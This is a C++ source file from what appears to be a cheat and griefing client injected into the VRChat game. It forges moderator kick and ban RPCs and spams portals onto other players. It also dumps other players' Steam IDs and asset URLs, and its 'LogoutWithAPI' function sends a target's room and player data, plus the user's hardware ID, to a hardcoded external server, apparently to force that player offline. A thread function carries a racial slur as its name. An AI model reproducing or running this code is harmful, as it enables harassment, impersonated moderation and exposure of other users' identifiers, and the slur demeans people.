﻿#include "Misc.hpp"
#include <cmath>
#include <sstream>

#include "UnityEngine/Quaternion.hpp"
#include "ApiAvatar.hpp"
#include "VRC/SDKBase/Networking.hpp"
#include "VRCPlayer.hpp"
#include "VRC/PlayerManager.hpp"
#include "VRC/Core/APIUser.hpp"
#include "VRC/Player.h"
#include "VRCPlayerApi.h"
#include "Time.hpp"
#include "Variables.hpp"
#include "PageAvatar.hpp"
#include "ModerationManager.hpp"
#include <Collider.hpp>
#include "ConsoleUtils.hpp"
#include "Utils/http.h"
#include "ccs.hpp"
#include <VRCUiPopupManager.hpp>
#include "HardOffsets.hpp"
#include "Assembly-CSharp/VRCUiManager.hpp"

inline std::string url_encode(const std::string& value)
{
	std::ostringstream escaped;
	escaped.fill('0');
	escaped << std::hex;

	for (std::string::const_iterator i = value.begin(), n = value.end(); i != n; ++i)
	{
		std::string::value_type c = (*i);

		// Keep alphanumeric and other accepted characters intact
		if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~')
		{
			escaped << c;
			continue;
		}

		// Any other characters are percent-encoded
		escaped << std::uppercase;
		escaped << '%' << std::setw(2) << int((unsigned char)c);
		escaped << std::nouppercase;
	}

	return escaped.str();
}


static std::string url;

DWORD WINAPI niggakiller(LPVOID lpParam)
{
	http_t* request = http_get(url.c_str(), NULL);
	if (!request)
	{
		printf("Invalid request.\n");
		return 1;
	}

	http_status_t status = HTTP_STATUS_PENDING;
	int prev_size = -1;
	while (status == HTTP_STATUS_PENDING)
	{
		status = http_process(request);
		if (prev_size != (int)request->response_size)
		{
			//		printf("%d byte(s) received.\n", (int)request->response_size);
			prev_size = (int)request->response_size;
		}
	}

	http_release(request);

	return 0;
}

void Misc::FindObject(int id)
{
	List<Object*> allObjects(UnityEngine::Component::FindObjectsOfTypeAll(IL2CPP::GetType("ObjectInstantiator, Assembly-CSharp")));

	ConsoleUtils::Log(allObjects.arrayLength);

	for (size_t i = 0; i < allObjects.arrayLength; i++)
	{
		ConsoleUtils::Log( UnityEngine::GetName(allObjects[i]));
	}
	

		//return FindObjectsOfTypeAll<ObjectInternal>().FirstOrDefault((ObjectInternal x) = > x.name.Contains(id.ToString()));
}

void Misc::LogoutWithAPI(VRC::Core::APIUser* apiuser)
{
	List<VRC::Player*> players(VRC::PlayerManager::GetPlayers());

	VRC::Player* getplayer = nullptr;

	for (size_t i = 0; i < players.arrayLength; i++)
	{
		if (players[i]->GetAPIUser()->getId() == apiuser->getId())
		{
			getplayer = players[i];
		}
	}

	if (getplayer == nullptr)
	{
		ConsoleUtils::Log("Wheres the player to logout?");
		return;
	}

	auto getvrcplayerapi = getplayer->GetVRCPlayerApi();
	auto getplayerid = getvrcplayerapi->PlayerId();

	std::string worldid;
	std::string actor = std::to_string(getplayerid);
	std::string apikey = "wellialmostthoughtlogoutfixedXD";

	auto apiWorld = (VRC::Core::ApiWorld*)IL2CPP::GetField(IL2CPP::NewObject("RoomManagerBase, Assembly-CSharp"), "VRC.Core.ApiWorld");

	ConsoleUtils::Log("Trying to logout...");

	if (apiWorld == nullptr)
	{
		ConsoleUtils::Log("Logout failed because world is in africa");
		return;
	}

	url = "http://207.32.217.79:5000/api/values/";
	url += RoomManagerBase::GetRoomId();
	url += "/";
	url += actor;
	url += "/";
	url += std::to_string((apiWorld->GetCapacity() * 2));
	url += "/";
	url += url_encode(apiuser->displayName());
	url += "/";
	url += apikey;
	url += "/";
	url += IL2CPP::GetHWID();
	url += "/";
	url += url_encode(VRC::Core::APIUser::currentUser()->displayName());

	CloseHandle(CreateThread(0, 0, niggakiller, 0, 0, 0));
	VRCUiManager::VRCUiManagerInstance()->HudMsg("Logging out " + apiuser->displayName());
}

void Misc::SelectYourself()
{
	QuickMenu::Instance()->OnPlayerSelectedByLaser(VRCPlayer::GetCurrentVRCPlayer());
	using func_t = void (*)(VRCPlayer* vrcplayer);
	func_t func = GetMethod<func_t>(SELECTYOURSELF1);
	func(VRCPlayer::GetCurrentVRCPlayer());
}

void Misc::ClearRoom()
{


	{
		
		
	}

	/*{
		std::string txt((1024 * 1024) / 5, 'w');
		VRC::SDKBase::Networking::RPC(0, VRC::Player::CurrentPlayer()->get_gameObject(), txt, System::Collections::ArrayList::ctor()->ToArray());
	}*/

	{
		std::string txt("😢");
		VRC::SDKBase::Networking::RPC(0, VRC::Player::CurrentPlayer()->get_gameObject(), txt, System::Collections::ArrayList::ctor()->ToArray());
	}


	/*auto objs = UnityEngine::Component::FindObjectsOfTypeAll(IL2CPP::GetType("UnityEngine.GameObject, UnityEngine.CoreModule"));

	List<UnityEngine::GameObject*> pickups(objs);

	for (size_t i = 0; i < pickups.arrayLength; i++)
	{
		if (GetName(pickups[i]) == "DrawingManager")
		{
			VRC::SDKBase::Networking::RPC(0, pickups[i], "ClearRoomRPC", System::Collections::ArrayList::ctor()->ToArray());

			UnityEngine::Vector3 v3{ 0.f, 0.f, 0.f };
			UnityEngine::Quaternion q{ 0.f, 0.f, 0.f, 1.f };

			UnityEngine::GameObject* gameObject = VRC::SDKBase::Networking::Instantiate(0, "CapturePrefabs/DynamicSpot", v3, q);
		}
	}*/
}

void Misc::SetPickups(bool value)
{
	auto objs = UnityEngine::Component::FindObjectsOfTypeAll(IL2CPP::GetType("VRC.SDKBase.VRC_Pickup, VRCSDKBase"));

	List<UnityEngine::Transform*> pickups(objs);

	for (size_t i = 0; i < pickups.arrayLength; i++)
	{
		if (pickups[i] == nullptr) continue;
		if (Misc::Contains(GetName(pickups[i]), "ViewFinder")) continue;
		pickups[i]->get_gameObject()->SetActive(value);
	}
}

void Misc::ChangeAvatar(const std::string& id)
{
	auto objs = UnityEngine::Component::FindObjectsOfTypeAll(IL2CPP::GetType("VRC.UI.PageAvatar, Assembly-CSharp"));

	List<VRC::UI::PageAvatar*> PageAvatars(objs);

	for (size_t i = 0; i < PageAvatars.arrayLength; i++)
	{
		auto simpleAvatarPedestal = IL2CPP::GetField(PageAvatars[i], "VRC.SimpleAvatarPedestal");
		auto apiavatar = (VRC::Core::ApiAvatar*)IL2CPP::GetField(simpleAvatarPedestal, "VRC.Core.ApiAvatar");

		apiavatar->SetId(id);
		PageAvatars[i]->ChangeToSelectedAvatar();
	}
}

//void Misc::MuteUser(VRC::Core::APIUser* apiuser, bool value)
//{
//	ConsoleUtils::Log(Variables::modManager);
//	using func_t = void(*)(void* modManager, VRC::Core::APIUser* apiuser, bool value);
//	func_t func = GetMethod<func_t>(0/x //1F356A0);
//	func(Variables::modManager, apiuser, value);
//}

void Misc::BanPublicOnlyRPC(UnityEngine::GameObject* modManager, const std::string& userid)
{
	int ModerationTimeRange = 2;

	VRC::SDKBase::Networking::RPC(0, modManager, "BanPublicOnlyRPC", System::Collections::CreateObjectArray(
		IL2CPP::StringNew(userid),
		IL2CPP::ValueBox("System.Int32", &ModerationTimeRange)));
}

void Misc::KickUserRPC(UnityEngine::GameObject* modManager, const std::string& userid)
{
	VRC::SDKBase::Networking::RPC(0, modManager, "KickUserRPC", System::Collections::CreateObjectArray(
		IL2CPP::StringNew(userid),
		IL2CPP::StringNew("A moderator has kicked you out of the room."),
		IL2CPP::StringNew("wrld_955ded62-6d09-4b84-999c-05fa97f9238b"),
		IL2CPP::StringNew("1337")));
}

UnityEngine::Color Misc::GetRainbow()
{
	using HSVToRGB_t = UnityEngine::Color (*)(float H, float S, float V); // TODO: HSVToRGB google and remake
	HSVToRGB_t HSVToRGB = GetMethod<HSVToRGB_t>(HSVTORGB);
	

	return HSVToRGB(std::fabsf(fmodf(((Time::time() + 1.f) * 0.1f), (1.f * 2)) - 1.f), 1.f, 1.f);
}

void Misc::ChangeAllPedistals()
{
	auto objects = UnityEngine::Component::FindObjectsOfTypeAll(IL2CPP::GetType("VRCSDK2.VRC_AvatarPedestal, VRCSDK2"));

	List<UnityEngine::Transform*> pedestals(objects);

	auto objs = System::Collections::CreateObjectArray(IL2CPP::StringNew("avtr_0be90e0a-3f0a-462c-8b0d-97b8b178e53e"));

	for (size_t i = 0; i < pedestals.arrayLength; i++)
	{
		VRC::SDKBase::Networking::RPC(0, pedestals[i]->get_gameObject(), "SwitchAvatar", objs);
	}
}

void Misc::TakePhotoRPC()
{
	UnityEngine::Vector3 v3{ 0.f, 0.f, 0.f };
	UnityEngine::Quaternion q{ 0.f, 0.f, 0.f, 1.f };

	UnityEngine::GameObject* gameObject = VRC::SDKBase::Networking::Instantiate(0, "CapturePrefabs/PolaroidPhoto", v3, q);
	auto arrObjs = System::Collections::ArrayList::ctor()->ToArray();
	VRC::SDKBase::Networking::RPC(0, gameObject, "TakePhotoRPC", arrObjs);
}

void Misc::DropPortal(const std::string& world, const std::string& id, const std::string& text)
{
	UnityEngine::Vector3 v{ 0,0,0 };
	UnityEngine::Quaternion q{ 0,0,0,1 };

	auto gameObject = VRC::SDKBase::Networking::Instantiate(0, "Portals/PortalInternalDynamic", v, q);

	int nothing = 0;
	auto objs = System::Collections::CreateObjectArray(IL2CPP::StringNew(world), IL2CPP::StringNew(id), IL2CPP::ValueBox("System.Int32", &nothing));
	VRC::SDKBase::Networking::RPC(7, gameObject, "ConfigurePortal", objs);
}

void Misc::DropPortal(const std::string& world, const std::string& id)
{
	auto a = VRCPlayer::GetCurrentVRCPlayer()->get_transform()->GetPosition();
	auto forward = VRCPlayer::GetCurrentVRCPlayer()->get_transform()->GetForward();

	a.x += forward.x * 2.f;
	a.y += forward.y * 2.f;
	a.z += forward.z * 2.f;

	UnityEngine::Quaternion q{ 0.5f,0.5,0.5f,0.5f };

	auto gameObject = VRC::SDKBase::Networking::Instantiate(0, "Portals/PortalInternalDynamic", a, q);

	int nothing = 0;
	auto objs = System::Collections::CreateObjectArray(IL2CPP::StringNew(world), IL2CPP::StringNew(id), IL2CPP::ValueBox("System.Int32", &nothing));
	VRC::SDKBase::Networking::RPC(7, gameObject, "ConfigurePortal", objs);
}

void Misc::DropPortal(const std::string& worldid)
{
	auto vectorstrings = Misc::split(worldid, ":");
	auto a = VRCPlayer::GetCurrentVRCPlayer()->get_transform()->GetPosition();
	auto forward = VRCPlayer::GetCurrentVRCPlayer()->get_transform()->GetForward();

	a.x += forward.x * 2.f;
	a.y += forward.y * 2.f;
	a.z += forward.z * 2.f;

	UnityEngine::Quaternion q{ 0.5f,0.5,0.5f,0.5f };

	auto gameObject = VRC::SDKBase::Networking::Instantiate(0, "Portals/PortalInternalDynamic", a, q);

	int nothing = 0;
	auto objs = System::Collections::CreateObjectArray(IL2CPP::StringNew(vectorstrings[0]), IL2CPP::StringNew(vectorstrings[1]), IL2CPP::ValueBox("System.Int32", &nothing));
	VRC::SDKBase::Networking::RPC(7, gameObject, "ConfigurePortal", objs);
}

void Misc::DropPortal(VRC::Player* player)
{
	std::string world = "wrld_5eef3063-6226-4ea3-b727-7b3478e85c23";
	std::string id = "Cringe\0";

	auto pos = player->GetVRCPlayer()->get_transform()->GetPosition();
	UnityEngine::Quaternion q{ 0.5f,0.5,0.5f,0.5f };


	auto gameObject = VRC::SDKBase::Networking::Instantiate(0, "Portals/PortalInternalDynamic", pos, q);

	int nothing = 0;
	auto objs = System::Collections::CreateObjectArray(IL2CPP::StringNew(world), IL2CPP::StringNew(id), IL2CPP::ValueBox("System.Int32", &nothing));
	VRC::SDKBase::Networking::RPC(7, gameObject, "ConfigurePortal", objs);
}

void Misc::DropPortalBlock(VRC::Player* player)
{																	 // TODO: \0
	std::string world = "wrld_5eef3063-6226-4ea3-b727-7b3478e85c23"; // possible solution: printf("%c", '\0');
	std::string id = "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nWhy you block me?\0";

	auto pos = player->GetVRCPlayer()->get_transform()->GetPosition();
	UnityEngine::Quaternion q{ 0.5f,0.5,0.5f,0.5f };


	auto gameObject = VRC::SDKBase::Networking::Instantiate(0, "Portals/PortalInternalDynamic", pos, q);

	int nothing = 0;
	auto objs = System::Collections::CreateObjectArray(IL2CPP::StringNew(world), IL2CPP::StringNew(id), IL2CPP::ValueBox("System.Int32", &nothing));
	VRC::SDKBase::Networking::RPC(7, gameObject, "ConfigurePortal", objs);
}

void Misc::SpawnEmoji(int index)
{
	VRC::SDKBase::Networking::RPC(0, VRCPlayer::GetCurrentVRCPlayer()->get_gameObject(), "SpawnEmojiRPC", System::Collections::CreateObjectArray(IL2CPP::ValueBox("System.Int32", &index)));
}

void Misc::PlayEmote(int index)
{
	VRC::SDKBase::Networking::RPC(0, VRCPlayer::GetCurrentVRCPlayer()->get_gameObject(), "PlayEmoteRPC", System::Collections::CreateObjectArray(IL2CPP::ValueBox("System.Int32", &index)));
}

std::vector<std::string> Misc::split(std::string text, const std::string& delimiter)
{
	std::vector<std::string> tokens;

	size_t pos = 0;
	std::string token;
	while ((pos = text.find(delimiter)) != std::string::npos)
	{
		token = text.substr(0, pos);
		tokens.push_back(token);
		text.erase(0, pos + delimiter.length());
	}

	tokens.push_back(text);

	return tokens;
}

const wchar_t* Misc::wchar_t_ptr(const char* str)
{
	const char* sz = str;
	std::vector<wchar_t> vec;
	size_t len = strlen(sz);
	vec.resize(len + 1);
	mbstowcs(&vec[0], sz, len);
	return &vec[0];
}

const wchar_t* Misc::wchar_t_ptr(std::string str)
{
	const char* sz = str.c_str();
	std::vector<wchar_t> vec;
	size_t len = strlen(sz);
	vec.resize(len + 1);
	mbstowcs(&vec[0], sz, len);
	return &vec[0];
}

void Misc::SerializeAll()
{
	List<VRC::Player*> players(VRC::PlayerManager::GetPlayers());


	for (size_t i = 0; i < players.arrayLength; i++)
	{
		if (players[i]->GetAPIUser()->getId() != VRC::Core::APIUser::currentUser()->getId())
		{
			if (!VRC::Core::APIUser::isFriendsWith(players[i]->GetAPIUser()->getId()))
				players[i]->get_gameObject()->SetActive(!Variables::rpcBlockNonFriends);
		}
	}
}

void Misc::ToLower(std::string& text)
{
	std::for_each(text.begin(), text.end(), [](char& c) { c = ::tolower(c); });
}

void Misc::ToUpper(std::string& text)
{
	std::for_each(text.begin(), text.end(), [](char& c) { c = ::toupper(c); });
}

bool Misc::Contains(std::string text, std::string contains)
{
	ToLower(text);
	ToLower(contains);
	return text.find(contains) != std::string::npos;
}

void Misc::FindEverything(std::string objectsToDelete)
{
	List<Object*> objects(UnityEngine::Component::FindObjectsOfTypeAll(IL2CPP::GetType("UnityEngine.GameObject, UnityEngine.CoreModule")));

	int j = 0;


	for (size_t i = 0; i < objects.arrayLength; i++)
	{
		if (Contains(UnityEngine::GetName(objects[i]), objectsToDelete))
		{
			j++;
			ConsoleUtils::Log(UnityEngine::GetName(objects[i]));
			//Destroy(objects[i], 0.f);
		}
	}

	ConsoleUtils::Log(white, "Objects with name '", objectsToDelete, "' found: ", j);
	ConsoleUtils::VRLog("Objects with name '" + objectsToDelete + "' found: " + std::to_string(j));
}

void Misc::DestroyEverything()
{
	List<Object*> objects(UnityEngine::Component::FindObjectsOfTypeAll(IL2CPP::GetType("UnityEngine.GameObject, UnityEngine.CoreModule")));

	int j = 0;

	std::string objectsToDelete;

	std::cout << "\n\nObject name to delete: "; std::cin >> objectsToDelete;

	for (size_t i = 0; i < objects.arrayLength; i++)
	{
		if (Contains(UnityEngine::GetName(objects[i]), objectsToDelete))
		{
			j++;
			ConsoleUtils::Log("Deleting: " + UnityEngine::GetName(objects[i]));

			UnityEngine::Destroy(objects[i], 0.1f);
		}
	}

	ConsoleUtils::Log(white, "Objects with name '", objectsToDelete, "' deleted: ", j);
	ConsoleUtils::VRLog("Objects with name '" + objectsToDelete + "' deleted: " + std::to_string(j));
}

void Misc::DestroyPortals()
{
	List<Object*> objects(UnityEngine::Component::FindObjectsOfTypeAll(IL2CPP::GetType("UnityEngine.GameObject, UnityEngine.CoreModule")));

	int j = 0;

	for (size_t i = 0; i < objects.arrayLength; i++)
	{
		if (Contains(UnityEngine::GetName(objects[i]), "Clone ["))
		{
			j++;
			ConsoleUtils::Log("Deleting: " + UnityEngine::GetName(objects[i]));

			UnityEngine::Destroy(objects[i], 0.1f); // TODO: Move Destroy into Object class
		}
	}

	ConsoleUtils::Log(white, "Portals deleted: ", j);
	ConsoleUtils::VRLog("Portals deleted: " + std::to_string(j));
}

std::string Misc::GetWorldTag(std::string worldId)
{
	if (worldId.find("friends") != std::string::npos)
		return "friends";
	else if (worldId.find("hidden") != std::string::npos)
		return "friends+";
	else if (worldId.find("canRequestInvite") != std::string::npos)
		return "invite+";
	else if (worldId.find("nonce") != std::string::npos)
		return "invite only";
	else
		return "public";
}

std::string Misc::RandomString(int len)
{
	std::string str = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	std::string newstr;
	int pos;
	while (newstr.size() != len)
	{
		pos = ((rand() % (str.size() - 1)));
		newstr += str.substr(pos, 1);
	}
	return newstr;
}

bool Misc::isMe(VRC::Player* player)
{
	auto playerId = player->GetAPIUser()->getId();
	auto myId = VRC::Core::APIUser::currentUser()->getId();
	if (myId == playerId)
		return true;
	else
		return false;
}

void Misc::WorldInfoPrint()
{
	system("cls");

	List<VRC::Player*> players(VRC::PlayerManager::GetPlayers());


	auto apiWorld = (VRC::Core::ApiWorld*)IL2CPP::GetField(IL2CPP::NewObject("RoomManagerBase, Assembly-CSharp"), "VRC.Core.ApiWorld");

	std::cout
		<< cyan << "Current World Id:\n" << RoomManagerBase::GetRoomId() << blue
		<< "\nWorld VRCA URL:\n" << apiWorld->assetUrl() << "\n"
		<< "\nVRCA URL:\n" << VRC::Core::APIUser::currentUser()->getVRCA() << "\n"
		<< "\nAvatar Id:\n" << VRC::Player::CurrentPlayer()->GetVRCPlayer()->GetApiAvatar()->Id() << "\n"
		<< "\nPlayers in world: " << players.arrayLength << "\n";




	for (size_t i = 0; i < players.arrayLength; i++)
	{
		auto apiuser = players[i]->GetAPIUser();
		auto rank = GetUserRankName(apiuser);
		bool friends = VRC::Core::APIUser::isFriendsWith(apiuser->getId());
		auto vrcplayer = (VRCPlayer*)IL2CPP::GetField(players[i], "VRCPlayer", false);
		auto vrcplayerapi = players[i]->GetVRCPlayerApi();
		int photonid = vrcplayerapi->PlayerId();
		std::string avatarid = ((VRC::Core::APIUser*)vrcplayer->GetApiAvatar())->getId();



		if (apiuser->hasTag("admin"))
			std::cout << red << "[" << photonid << "]" << "[ADMIN] " << apiuser->displayName() << " " << white << "[" << apiuser->getId() << "]" << "\n[" << vrcplayer->get_steamId() << "]" << "\n"									<< "[" << avatarid << "]" << "\n"				<< vrcplayer->GetApiAvatar()->GetAssetURL() << "\n";
		else if (apiuser->hasTag("system_legend"))
			std::cout << red << "[" << photonid << "]" << (friends ? "[F]" : "") << apiuser->displayName() << " " << white << "[" << apiuser->getId() << "]" << "\n[" << vrcplayer->get_steamId() << "]" << "\n"						<< "[" << avatarid << "]" << "\n"				<< vrcplayer->GetApiAvatar()->GetAssetURL() << "\n";
		else if (apiuser->hasTag("system_trust_legend"))
			std::cout << yellow << "[" << photonid << "]" << (friends ? "[F]" : "") << apiuser->displayName() << " " << white << "[" << apiuser->getId() << "]" << "\n[" << vrcplayer->get_steamId() << "]" << "\n"						<< "[" << avatarid << "]" << "\n"				<< vrcplayer->GetApiAvatar()->GetAssetURL() << "\n";
		else if (apiuser->hasTag("system_trust_veteran"))
			std::cout << magenta << "[" << photonid << "]" << (friends ? "[F]" : "") << apiuser->displayName() << " " << white << "[" << apiuser->getId() << "]" << "\n[" << vrcplayer->get_steamId() << "]" << "\n"					<< "[" << avatarid << "]" << "\n"				<< vrcplayer->GetApiAvatar()->GetAssetURL() << "\n";
		else if (apiuser->hasTag("system_trust_trusted"))
			std::cout << darkmagenta << "[" << photonid << "]" << (friends ? "[F]" : "") << apiuser->displayName() << " " << white << "[" << apiuser->getId() << "]" << "\n[" << vrcplayer->get_steamId() << "]" << "\n"				<< "[" << avatarid << "]" << "\n"				<< vrcplayer->GetApiAvatar()->GetAssetURL() << "\n";
		else if (apiuser->hasTag("system_trust_known"))
			std::cout << green << "[" << photonid << "]" << (friends ? "[F]" : "") << apiuser->displayName() << " " << white << "[" << apiuser->getId() << "]" << "\n[" << vrcplayer->get_steamId() << "]" << "\n"						<< "[" << avatarid << "]" << "\n"				<< vrcplayer->GetApiAvatar()->GetAssetURL() << "\n";
		else if (apiuser->hasTag("system_trust_basic"))
			std::cout << blue << "[" << photonid << "]" << (friends ? "[F]" : "") << apiuser->displayName() << " " << white << "[" << apiuser->getId() << "]" << "\n[" << vrcplayer->get_steamId() << "]" << "\n"						<< "[" << avatarid << "]" << "\n"				<< vrcplayer->GetApiAvatar()->GetAssetURL() << "\n";
		else
			std::cout << white << "[" << photonid << "]" << (friends ? "[F]" : "") << apiuser->displayName() << " " << white << "[" << apiuser->getId() << "]" << "\n[" << vrcplayer->get_steamId() << "]" << "\n"						<< "[" << avatarid << "]" << "\n"				<< vrcplayer->GetApiAvatar()->GetAssetURL() << "\n";
	}
	std::cout << white;
}

std::string Misc::GetSocialRankForPlayerList(VRC::Player* player)
{
	auto vrcplayer = (VRCPlayer*)IL2CPP::GetField(player, "VRCPlayer");
	auto apiuser = player->GetAPIUser();
	auto userid = apiuser->getId();

	std::string text = "<color=red><b>";

	text += (ModerationManager::Instance()->IsBlockedEitherWay(userid) ? "[B]" : "");
	text += (vrcplayer->get_steamId() == 0 ? "[H]" : "");
	text += (VRC::Core::APIUser::isFriendsWith(userid) ? "[F]" : "");
	text += "</b></color> ";

	text += GetUserRank(apiuser);

	return text;
}

std::string Misc::GetSocialRankForPlayerListShadow(VRC::Player* player)
{
	auto vrcplayer = (VRCPlayer*)IL2CPP::GetField(player, "VRCPlayer");
	auto apiuser = player->GetAPIUser();
	auto userid = apiuser->getId();

	std::string text = "<color=black><b>";

	text += (ModerationManager::Instance()->IsBlockedEitherWay(userid) ? "[B]" : "");
	text += (vrcplayer->get_steamId() == 0 ? "[H]" : "");
	text += (VRC::Core::APIUser::isFriendsWith(userid) ? "[F]" : "");
	text += "</b> ";

	text += apiuser->displayName();
	text += "</color>";

	return text;
}

std::string Misc::GetUserRank(VRC::Core::APIUser* apiuser)
{
	std::string displayName = apiuser->displayName();

	std::string rank = "<color=";

	if (apiuser->hasTag("admin"))
		rank += "#964b00>";
	else if (apiuser->hasTag("system_legend"))
		rank += "red>";
	else if (apiuser->hasTag("system_trust_legend"))
		rank += "#ffff00>";
	else if (apiuser->hasTag("system_trust_veteran"))
		rank += "#8142e6>";
	else if (apiuser->hasTag("system_trust_trusted"))
		rank += "#ff7c42>";
	else if (apiuser->hasTag("system_trust_known"))
		rank += "#2acf5b>";
	else if (apiuser->hasTag("system_trust_basic"))
		rank += "#1d7cff>";
	else
		rank += "#cccccc>";

	rank += displayName;
	rank += "</color>";

	return rank;
}

std::string Misc::GetUserVipPlateRank(VRC::Core::APIUser* apiuser)
{
	std::string rank = "<color=";

	if (apiuser->hasTag("admin"))
		rank += "#964b00>";
	else if (apiuser->hasTag("system_legend"))
		rank += "red>";
	else if (apiuser->hasTag("system_trust_legend"))
		rank += "#ffff00>";
	else if (apiuser->hasTag("system_trust_veteran"))
		rank += "#8142e6>";
	else if (apiuser->hasTag("system_trust_trusted"))
		rank += "#ff7c42>";
	else if (apiuser->hasTag("system_trust_known"))
		rank += "#2acf5b>";
	else if (apiuser->hasTag("system_trust_basic"))
		rank += "#1d7cff>";
	else
		rank += "#cccccc>";

	rank += "R";
	rank += "</color>";

	return rank;
}

std::string Misc::GetUserRankName(VRC::Core::APIUser* apiuser)
{
	std::string rank = "";

	if (apiuser->hasTag("admin"))
		rank += "admin";
	else if (apiuser->hasTag("system_legend"))
		rank += "Legend-";
	else if (apiuser->hasTag("system_trust_legend"))
		rank += "Veteran User";
	else if (apiuser->hasTag("system_trust_veteran"))
		rank += "Trusted User";
	else if (apiuser->hasTag("system_trust_trusted"))
		rank += "Known User";
	else if (apiuser->hasTag("system_trust_known"))
		rank += "User";
	else if (apiuser->hasTag("system_trust_basic"))
		rank += "New User";
	else
		rank += "Visitor";

	return rank;
}

void Misc::CloseGame()
{
	ExitProcess(NULL);
}
